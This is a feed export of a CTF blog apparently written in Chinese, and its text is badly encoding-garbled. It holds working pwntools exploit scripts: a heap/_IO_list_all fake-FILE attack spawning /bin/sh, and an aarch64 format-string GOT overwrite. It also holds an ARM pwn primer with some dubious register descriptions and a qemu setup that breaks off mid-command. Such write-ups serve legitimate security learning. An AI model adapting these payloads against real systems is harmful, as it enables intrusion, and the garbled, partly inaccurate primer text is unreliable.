class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;\n&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size :\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;Content :\n&#x27;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content=<span class="string">b&#x27;aaaa&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;Size :\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;Content :\n&#x27;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;110.40.35.73 33679&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span> </span><br><span class="line">    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0xaf8</span>)   <span class="comment">#0</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0xb00</span> , <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xaf0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x501</span>))</span><br><span class="line">    <span class="comment"># p()</span></span><br><span class="line">    add(<span class="number">0xb18</span>)   <span class="comment">#1</span></span><br><span class="line">    <span class="comment"># p()</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0xb20</span> , <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>))</span><br><span class="line">    <span class="comment"># p()</span></span><br><span class="line">    add(<span class="number">0xff0</span>)   <span class="comment">#2</span></span><br><span class="line">    <span class="comment"># p()</span></span><br><span class="line">    add(<span class="number">0xff0</span>)   <span class="comment">#3</span></span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    <span class="comment"># p()</span></span><br><span class="line">    add(<span class="number">0x4e0</span>-<span class="number">8</span>) <span class="comment">#4</span></span><br><span class="line">    <span class="comment"># p()</span></span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    show(<span class="number">4</span>)</span><br><span class="line">    heap_addr = uu64(r(<span class="number">8</span>)) - <span class="number">0x21b0a</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x18</span>)    <span class="comment">#5</span></span><br><span class="line">    show(<span class="number">5</span>)</span><br><span class="line">    libc_base = uu64(r64()) - <span class="number">0x3c4f0a</span></span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)   </span><br><span class="line"></span><br><span class="line">    io_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    system      = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) +  <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) + p64(io_list_all-<span class="number">0x10</span>)+p64(io_list_all-<span class="number">0x10</span>) +  p64(<span class="number">0</span>)+p64(<span class="number">1</span>) + p64(<span class="number">0</span>)*<span class="number">7</span> + p64(heap_addr+<span class="number">0x21b40</span>) +p64(<span class="number">0</span>)*<span class="number">13</span> + p64(heap_addr+<span class="number">0x21b40</span>+<span class="number">0xd8</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(system)</span><br><span class="line">    edit(<span class="number">5</span>, <span class="number">0x200</span>, payload)</span><br><span class="line"></span><br><span class="line">    leak(<span class="string">&quot;heap_addr&quot;</span>, heap_addr) </span><br><span class="line">    <span class="comment"># debug(&#x27;tele 0x004040E0 \n b*0x40157F &#x27;)</span></span><br><span class="line">    itr()</span><br></pre></td></tr></table></figure><h2 id="something-changed"><a href="#something-changed" class="headerlink" title="something_changed"></a>something_changed</h2><p>aarch64çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè¿œç¨‹æ˜¯qemuèµ·çš„ï¼ˆæ³„éœ²å‡ æ¬¡å‘ç°æ ˆåœ°å€å›ºå®šï¼‰ï¼Œä¿æŠ¤å…¨å…³ç›¸å½“äºæ˜¯ï¼Œè€Œä¸”è¿™é“é¢˜æœ¬èº«å°±æ²¡å¼€FULL RELROå’Œpieã€‚è¿˜ç»™äº†backdoor</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151131796.png" alt="image-20240715112941715"></p><p>ç›´æ¥ç”¨ä¸€æ¬¡æ€§æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥æ”¹__stack_chk_fail_gotä¸ºbackdoorå°±è¡Œäº†</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151130281.png" alt="image-20240715112949243"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407151131895.png" alt="image-20240715112956706"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    context.arch = <span class="string">&#x27;aarch64&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;120.79.91.95 3332&#x27;</span></span><br><span class="line">    <span class="comment"># IPort = &#x27;127.0.0.1 12345&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./silent&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-aarch64 -L ./ -g 12345 ./silent&#x27;</span>)</span><br><span class="line">    <span class="comment"># dbg(&quot;b *0x04007F4 \n b *0x000400854&quot;)</span></span><br><span class="line">    <span class="comment"># dbg(&quot;b *0x000400854&quot;)</span></span><br><span class="line"></span><br><span class="line">    scf = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]   <span class="comment">#14</span></span><br><span class="line">    backdoor = <span class="number">0x00400770</span></span><br><span class="line">    payload =  <span class="string">b&#x27;%1883c%c&#x27;</span> + <span class="string">b&#x27;%0c%0c%0c%0c%0c%0c%0c%c%c%c%c%c%c%c%c%c%c%caa%hn&#x27;</span>  + p64(scf)</span><br><span class="line">    sl(payload)</span><br><span class="line">    itr()</span><br><span class="line"><span class="comment">#canary   %19$p</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;baby-stack&quot;&gt;&lt;a href=&quot;#baby-stack&quot; class=&quot;headerlink&quot; title=&quot;baby_stack&quot;&gt;&lt;/a&gt;baby_stack&lt;/h2&gt;&lt;p&gt;waitå‡½æ•°é‡Œé¢æœ‰ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¤šè¯•å‡ æ¬¡èƒ½è¯•å‡ºæ¥offset&amp;#x3D;2</summary>
      
    
    
    
    <category term="WriteUP" scheme="http://tw11ty.github.io/categories/WriteUP/"/>
    
    
    <category term="writewp" scheme="http://tw11ty.github.io/tags/writewp/"/>
    
  </entry>
  
  <entry>
    <title>arm-pwnå…¥é—¨</title>
    <link href="http://tw11ty.github.io/2024/07/12/arm-pwn%E5%85%A5%E9%97%A8/"/>
    <id>http://tw11ty.github.io/2024/07/12/arm-pwn%E5%85%A5%E9%97%A8/</id>
    <published>2024-07-12T13:02:32.000Z</published>
    <updated>2024-11-16T08:37:16.609Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸€äº›å¸ˆå‚…çš„åšå®¢ï¼š</p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16077191.html">å…³äºå­¦ä¹ armæ¶æ„ä¸‹çš„pwnçš„æ€»ç»“ - ZikH26 - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://blingblingxuanxuan.github.io/2021/01/27/arm-pwn-start/#arm-pwn%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD">arm pwn å…¥é—¨ | blingblingâ€™s blog (blingblingxuanxuan.github.io)</a></p><p><a href="https://sky123.blog.csdn.net/article/details/135730371?spm=1001.2014.3001.5502">IOT pwn_apt install mips-linux-CSDNåšå®¢</a></p><p><a href="https://bbs.kanxue.com/thread-272332.htm#msg_header_h2_1">[åŸåˆ›] CTF ä¸­ ARM &amp; AArch64 æ¶æ„ä¸‹çš„ Pwn-Pwn-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a> </p><p>ä¹Ÿå‚è€ƒäº†è®¸å¤šå…¶ä»–å¸ˆå‚…ä»¬çš„åšå®¢ï¼Œè¿™é‡Œä¸ä¸€ä¸€è´´å‡ºæ¥äº†ã€‚</p><p>æœ€è¿‘åˆšå¥½åœ¨çœ‹ ã€Šè®¡ç®—æœºç»„æˆåŸç†ï¼ˆ Alan Clements ï¼‰ã€‹ï¼Œä»¥ARMä½“ç³»æ¶æ„ä¸ºä¾‹ï¼Œè¯¦ç»†ä»‹ç»å…¶æŒ‡ä»¤é›†ã€å¯„å­˜å™¨ç»“æ„ã€æŒ‡ä»¤æ‰§è¡Œæµç¨‹ç­‰æ ¸å¿ƒå†…å®¹ã€‚å¯¹armå…¥é—¨å¾ˆæœ‰å¸®åŠ©ã€‚</p><h1 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h1><p>- <a href="#arm_reg">ARMå¯„å­˜å™¨é›†</a></p><p>- <a href="#arm_code">ARMæŒ‡ä»¤é›†</a></p><p>- <a href="#env">ARM PWNç¯å¢ƒæ­å»º</a></p><ul><li><a href="#%E7%9B%AE%E5%BD%95">ç›®å½•</a></li><li><a href="#arm%E5%AF%84%E5%AD%98%E5%99%A8%E9%9B%86">ARMå¯„å­˜å™¨é›†</a></li><li><a href="#arm%E6%8C%87%E4%BB%A4%E9%9B%86">ARMæŒ‡ä»¤é›†</a></li><li><a href="#arm-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">ARM PWNç¯å¢ƒæ­å»º</a></li><li><a href="#%E9%A2%98%E7%9B%AE%E4%B8%8032%E4%BD%8D-arm%E6%9E%B6%E6%9E%84-%E9%9D%99%E6%80%81">é¢˜ç›®ä¸€ï¼š32ä½ armæ¶æ„ é™æ€</a><ul><li><a href="#%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8"><strong>æ¢å¤ç¬¦å·è¡¨</strong></a></li></ul></li><li><a href="#%E9%A2%98%E7%9B%AE%E4%BA%8C32%E4%BD%8D-arm%E6%9E%B6%E6%9E%84-%E5%8A%A8%E6%80%81">é¢˜ç›®äºŒï¼š32ä½ armæ¶æ„ åŠ¨æ€</a></li><li><a href="#%E9%A2%98%E7%9B%AE%E4%B8%8964%E4%BD%8D-aarch64%E6%9E%B6%E6%9E%84-%E5%8A%A8%E6%80%81">é¢˜ç›®ä¸‰ï¼š64ä½ aarch64æ¶æ„ åŠ¨æ€</a></li><li><a href="#%E9%A2%98%E7%9B%AE%E5%9B%9B32%E4%BD%8D-arm-ret2libc">é¢˜ç›®å››ï¼š32ä½ arm ret2libc</a></li><li><a href="#%E9%A2%98%E7%9B%AE%E4%BA%94aarch64%E6%9E%B6%E6%9E%84-off-by-null">é¢˜ç›®äº”ï¼šaarch64æ¶æ„ off by null</a><ul><li><a href="#%E6%9C%AC%E5%9C%B0%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91"><strong>æœ¬åœ°äº¤å‰ç¼–è¯‘</strong></a></li></ul></li><li><a href="#%E9%A2%98%E7%9B%AE%E5%85%ADaarch64%E6%9E%B6%E6%9E%84-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2">é¢˜ç›®å…­ï¼šaarch64æ¶æ„ æ ¼å¼åŒ–å­—ç¬¦ä¸²</a></li></ul><h1 id="ARMå¯„å­˜å™¨é›†"><a href="#ARMå¯„å­˜å™¨é›†" class="headerlink" title="ARMå¯„å­˜å™¨é›†"></a>ARMå¯„å­˜å™¨é›†<a id="arm_reg"></a></h1><p>ARMæŒ‡ä»¤é›†ä½“ç³»ç»“æ„å±äºRISCï¼ˆç²¾ç®€æŒ‡ä»¤é›†ï¼‰ 32ä½ å¯„å­˜å™¨-å¯„å­˜å™¨å‹çš„ä½“ç³»ç»“æ„ï¼Œä½¿ç”¨load&#x2F;stortæŒ‡ä»¤åœ¨å­˜å‚¨å™¨ä¸å¯„å­˜å™¨ä¹‹é—´ç§»åŠ¨æ•°æ®</p><p>å…·æœ‰è§„æ•´çš„32ä½æŒ‡ä»¤æ ¼å¼ï¼Œä¸èƒ½å¤ŸåƒPentiumé‚£æ ·çš„CISCå¤„ç†å™¨å°†åœ°å€ä»¥åŠ16ä½æˆ–è€…32ä½æ•°æ®åŠ è½½åˆ°å¯„å­˜å™¨ä¸­ã€‚</p><p>ARM32å¯„å­˜å™¨é›†</p><ul><li>R0 å­˜å‚¨ä¸´æ—¶å˜é‡ æˆ–è€… å‡½æ•°è¿”å›å€¼</li><li>R0~R3 å››ä¸ªå¯„å­˜å™¨å­˜å‚¨å‡½æ•°è°ƒç”¨æ—¶å‰4ä¸ªå‚æ•° å¤šä½™å‚æ•°æ”¾åˆ°æ ˆä¸Š</li><li>R7 ç³»ç»Ÿè°ƒç”¨å·</li><li>R11å¯„å­˜å™¨å³å¯ä»¥ç”¨æ¥è®°å½•å›æº¯ä¿¡æ¯,ä¹Ÿå¯ä»¥å½“åšå±€éƒ¨å˜é‡æ¥ä½¿ç”¨   â€“&gt; ç›¸å½“äºebp   FP</li><li>R13 SP æŒ‡å‘æ ˆé¡¶</li><li>R14 LP å­˜æ”¾å‡½æ•°è¿”å›åœ°å€</li><li>R15   PC(ç¨‹åºè®¡æ•°å™¨) IP    ä¸x86ä¸åŒçš„ç‚¹åœ¨äºPCåœ¨ARMçŠ¶æ€ä¸‹å­˜å‚¨å½“å‰æŒ‡ä»¤+8çš„åœ°å€ã€‚</li></ul><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407111228109.png" alt="image-20240711122858943"></p><p>å½“å‰çŠ¶æ€å¤„ç†å™¨ï¼ˆCPSRï¼‰ï¼šZï¼ˆé›¶ï¼‰ Nï¼ˆè´Ÿï¼‰ Cï¼ˆè¿›ä½ï¼‰ Vï¼ˆæº¢å‡ºï¼‰ï¼Œä½å…«ä½åŒ…å«ç³»ç»Ÿä¿¡æ¯</p><p>aarchå¯„å­˜å™¨é›†</p><p>X0: ä¹Ÿç§°ä¸ºé›¶å¯„å­˜å™¨ï¼Œç”¨äºå­˜å‚¨å‡½æ•°çš„è¿”å›å€¼ã€ä¼ é€’å‡½æ•°å‚æ•°å’Œä¸´æ—¶å­˜å‚¨å˜é‡ã€‚</p><p>X1-X7: ç”¨äºä¼ é€’å‡½æ•°å‚æ•°å’Œä¸´æ—¶å­˜å‚¨å˜é‡ã€‚</p><p>X8: ä¹Ÿç§°ä¸ºç¨‹åºè®¡æ•°å™¨(PC)ï¼Œç”¨äºå­˜å‚¨å½“å‰æ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€ã€‚å½“å¤„ç†å™¨æ‰§è¡Œä¸€æ¡æŒ‡ä»¤æ—¶ï¼ŒPCä¼šè‡ªåŠ¨é€’å¢ä»¥æŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</p><p>X9-X15: Caller Savedå¯„å­˜å™¨ï¼Œç”¨äºå­˜å‚¨å‡½æ•°å‚æ•°ã€å±€éƒ¨å˜é‡å’Œä¸´æ—¶æ•°æ®ã€‚</p><p>X16-X17: ä¹Ÿç§°ä¸ºä¸´æ—¶å¯„å­˜å™¨ï¼Œç”¨äºå­˜å‚¨ä¸´æ—¶æ•°æ®ï¼Œè¿™äº›å¯„å­˜å™¨åœ¨å‡½æ•°è°ƒç”¨æœŸé—´ä¸éœ€è¦ä¿ç•™å…¶å€¼ã€‚</p><p>X18: ä¹Ÿç§°ä¸ºå¹³å°ç›¸å…³å¯„å­˜å™¨ï¼Œç”¨äºå­˜å‚¨ä¸ç‰¹å®šå¹³å°ç›¸å…³çš„ä¿¡æ¯ï¼Œå¦‚TLSï¼ˆçº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼‰æŒ‡é’ˆã€‚</p><p>X19-X28: Callee Savedå¯„å­˜å™¨ï¼Œäºå­˜å‚¨å‡½æ•°å‚æ•°ã€å±€éƒ¨å˜é‡å’Œä¸´æ—¶æ•°æ®ã€‚</p><p>X29: ä¹Ÿç§°ä¸ºå¸§æŒ‡é’ˆå¯„å­˜å™¨ï¼ˆFrame Pointerï¼ŒFPï¼‰ï¼Œç”¨äºå­˜å‚¨å½“å‰å‡½æ•°çš„å †æ ˆå¸§æŒ‡é’ˆã€‚å½“å‡½æ•°è°ƒç”¨å‘ç”Ÿæ—¶ï¼Œx29å¯„å­˜å™¨çš„å€¼è¢«ä¿å­˜åˆ°å †æ ˆä¸­ï¼Œä»¥ä¾¿åœ¨å‡½æ•°æ‰§è¡ŒæœŸé—´å¯ä»¥è½»æ¾åœ°è®¿é—®ä¸Šä¸€çº§å‡½æ•°çš„å †æ ˆå¸§ã€‚è¿™æ ·ï¼Œå½“å‡½æ•°è¿”å›æ—¶ï¼Œå¯ä»¥é€šè¿‡æ¢å¤x29å¯„å­˜å™¨çš„å€¼æ¥æ¢å¤åˆ°æ­£ç¡®çš„å †æ ˆå¸§ã€‚</p><p>X30: ä¹Ÿç§°ä¸ºé“¾æ¥å¯„å­˜å™¨ï¼ˆLink Registerï¼ŒLRï¼‰ï¼Œç”¨äºå­˜å‚¨å‡½æ•°è°ƒç”¨çš„è¿”å›åœ°å€ã€‚å½“å‡½æ•°æ‰§è¡Œå®Œæ¯•æ—¶ï¼Œå¤„ç†å™¨å°†ä½¿ç”¨x30å¯„å­˜å™¨ä¸­å­˜å‚¨çš„è¿”å›åœ°å€æ¥æ¢å¤åˆ°è°ƒç”¨ç‚¹ã€‚è¿™æ ·ï¼Œæ§åˆ¶æµç¨‹å¯ä»¥é¡ºåˆ©è¿”å›åˆ°è°ƒç”¨å‡½æ•°çš„ä½ç½®ç»§ç»­æ‰§è¡Œã€‚</p><p>X31: SP æ ˆé¡¶</p><h1 id="ARMæŒ‡ä»¤é›†"><a href="#ARMæŒ‡ä»¤é›†" class="headerlink" title="ARMæŒ‡ä»¤é›†"></a>ARMæŒ‡ä»¤é›†<a id="arm_code"></a></h1><p><strong>åŸºç¡€æŒ‡ä»¤</strong></p><table><thead><tr><th>æŒ‡ä»¤</th><th>åŠŸèƒ½</th><th>æŒ‡ä»¤</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>MOV</td><td>ç§»åŠ¨æ•°æ®</td><td>EOR</td><td>æŒ‰ä½å¼‚æˆ–</td></tr><tr><td>MVN</td><td>ç§»åŠ¨æ•°æ®å¹¶å–å</td><td>LDR</td><td>åŠ è½½</td></tr><tr><td>ADD</td><td>åŠ æ³•</td><td>STR</td><td>å­˜å‚¨</td></tr><tr><td>SUB</td><td>å‡æ³•</td><td>LDM</td><td>åŠ è½½å¤šä¸ª</td></tr><tr><td>MUL</td><td>ä¹˜æ³•</td><td>STM</td><td>å­˜å‚¨å¤šä¸ª</td></tr><tr><td>LSL</td><td>é€»è¾‘å·¦ç§»</td><td>PUSH</td><td>å…¥æ ˆ</td></tr><tr><td>LSR</td><td>é€»è¾‘å³ç§»</td><td>POP</td><td>å‡ºæ ˆ</td></tr><tr><td>ASR</td><td>ç®—æœ¯å³ç§»</td><td>B</td><td>è·³è½¬</td></tr><tr><td>ROR</td><td>å³æ—‹</td><td>BL</td><td>Link+è·³è½¬</td></tr><tr><td>CMP</td><td>æ¯”è¾ƒ</td><td>BX</td><td>åˆ†æ”¯è·³è½¬</td></tr><tr><td>AND</td><td>æŒ‰ä½ä¸</td><td>BLX</td><td>Linx+åˆ†æ”¯è·³è½¬</td></tr><tr><td>ORR</td><td>æŒ‰ä½æˆ–</td><td>SWI&#x2F;SVC</td><td>ç³»ç»Ÿè°ƒç”¨</td></tr></tbody></table><p><strong>æ¡ä»¶åˆ†æ”¯</strong></p><table><thead><tr><th>ç¼–ç </th><th>åŠ©è®°ç¬¦</th><th>åˆ†æ”¯æ ‡å¿—å’ŒçŠ¶æ€</th><th>æ‰§è¡Œæ¡ä»¶</th></tr></thead><tbody><tr><td>0000</td><td><strong>EQ</strong></td><td>zç½®ä½</td><td>ç›¸ç­‰  0</td></tr><tr><td>0001</td><td><strong>NE</strong></td><td>zæ¸…é›¶</td><td>ä¸ç­‰ !0</td></tr><tr><td>0010</td><td><strong>CS</strong></td><td>cç½®ä½</td><td>æ— ç¬¦å·å¤§äºç­‰äº</td></tr><tr><td>0011</td><td><strong>CC</strong></td><td>cæ¸…é›¶</td><td>æ— ç¬¦å·å°äº</td></tr><tr><td>0100</td><td><strong>MI</strong></td><td>nç½®ä½</td><td>è´Ÿ</td></tr><tr><td>0101</td><td><strong>PL</strong></td><td>næ¸…é›¶</td><td>æ­£æˆ–é›¶</td></tr><tr><td>0110</td><td><strong>VS</strong></td><td>vç½®ä½</td><td>æº¢å‡º</td></tr><tr><td>0111</td><td><strong>VC</strong></td><td>væ¸…é›¶</td><td>æœªæº¢å‡º</td></tr><tr><td>1000</td><td><strong>HI</strong></td><td>cç½®ä½ zæ¸…é›¶</td><td>æ— ç¬¦å·å¤§äº</td></tr><tr><td>1001</td><td><strong>LS</strong></td><td>cæ¸…é›¶ zç½®ä½</td><td>æ— ç¬¦å·å°äºç­‰äº</td></tr><tr><td>1010</td><td><strong>GE</strong></td><td>nã€våŒæ—¶ç½®ä½æˆ–æ¸…é›¶</td><td>å¤§äºç­‰äº</td></tr><tr><td>1011</td><td><strong>LT</strong></td><td>nã€våˆ†åˆ«ç½®ä½æˆ–æ¸…é›¶</td><td>å°äº</td></tr><tr><td>1100</td><td><strong>GT</strong></td><td>zæ¸…é›¶ nã€våŒæ—¶ç½®ä½æˆ–æ¸…é›¶</td><td>å¤§äº</td></tr><tr><td>1101</td><td><strong>LE</strong></td><td>zç½®ä½ nã€våˆ†åˆ«ç½®ä½æˆ–æ¸…é›¶</td><td>å°äºç­‰äº</td></tr><tr><td>1110</td><td><strong>AL</strong></td><td></td><td>æ€»æ˜¯</td></tr><tr><td>1111</td><td><strong>NV</strong></td><td></td><td>ä»ä¸</td></tr></tbody></table><p>ARMé€šè¿‡å—ç§»åŠ¨å®ç°ä¸€ä¸ªéå¸¸å¤æ‚çš„æ ˆç»“æ„</p><blockquote><p>test STMFD r13!, {r0-r4, r10, r14} ;ä¿å­˜å·¥ä½œå¯„å­˜å™¨ï¼Œå¹¶å°†è¿”å›åœ°å€ä¿å­˜åœ¨r14ä¸­</p><p>â€‹       â€¦â€¦</p><p>â€‹       LDMFD r13!, {r0-r4, r10, r15} ; æ¢å¤å·¥ä½œå¯„å­˜å™¨ï¼ŒæŠŠr14é€å…¥PCä¸­</p></blockquote><h1 id="ARM-PWNç¯å¢ƒæ­å»º"><a href="#ARM-PWNç¯å¢ƒæ­å»º" class="headerlink" title="ARM PWNç¯å¢ƒæ­å»º"></a>ARM PWNç¯å¢ƒæ­å»º<a id="env"></a></h1><p>åŸºç¡€ç¯å¢ƒå®‰è£…å¯çœ‹è¿™ä½å¸ˆå‚…<a href="https://binlep.github.io/old_blog_01/2020/03/20/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E8%B7%A8%E5%B9%B3%E5%8F%B0%E6%9E%B6%E6%9E%84%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%B8%8E%E8%B0%83%E8%AF%95/">ã€Pwn ç¬”è®°ã€‘è·¨å¹³å°æ¶æ„çš„ç¯å¢ƒé…ç½®ä¸è°ƒè¯• | binLepâ€™s Blog</a>ï¼Œå†™å¾—å¾ˆè¯¦ç»†</p><p>ä½¿ç”¨qemuæ„å»ºä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒæ¥è¿è¡Œarmæ–‡ä»¶ï¼Œä½¿ç”¨gdb-multiarchè¿æ¥åˆ°qemuï¼Œè¿›è¡Œè¿œç¨‹è°ƒè¯•</p><p>AArch64ï¼šæ˜¯ARMv8åŠæ›´é«˜ç‰ˆæœ¬ä¸­å¼•å…¥çš„64ä½æ¶æ„ã€‚è€Œqemu-armç”¨äºæ¨¡æ‹Ÿ32ä½çš„ARMæ¶æ„çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œqemu-aarch64ç”¨äºæ¨¡æ‹Ÿ64ä½çš„ARM aarch64æ¶æ„çš„äºŒè¿›åˆ¶æ–‡ä»¶</p><blockquote><p>wARMup: ELF 32-bit LSB executable, <strong>ARM</strong>, EABI5 version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-linux-armhf.so.3, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;fbe5794e95d6ea5006ea3137c0120ed945acae17, not stripped   â€“&gt; qemu-armæ¨¡æ‹Ÿ</p><p>shanghai_baby_arm: ELF 64-bit LSB executable, <strong>ARM aarch64</strong>, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-linux-aarch64.so.1, for GNU&#x2F;Linux 3.7.0, BuildID[sha1]&#x3D;e988eaee79fd41139699d813eac0c375dbddba43, stripped  â€“&gt; qemu-aarchæ¨¡æ‹Ÿ</p></blockquote><p>qemuè¿›è¡Œæ¨¡æ‹Ÿæ—¶ä½¿ç”¨-LåŠ è½½å¯¹åº”æ¶æ„çš„é“¾æ¥åº“ï¼ˆåœ¨usrç›®å½•ä¸‹ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu/ ./pwn</span><br><span class="line">qemu-arm -g 8888 -L /usr/arm-linux-gnueabihf/ 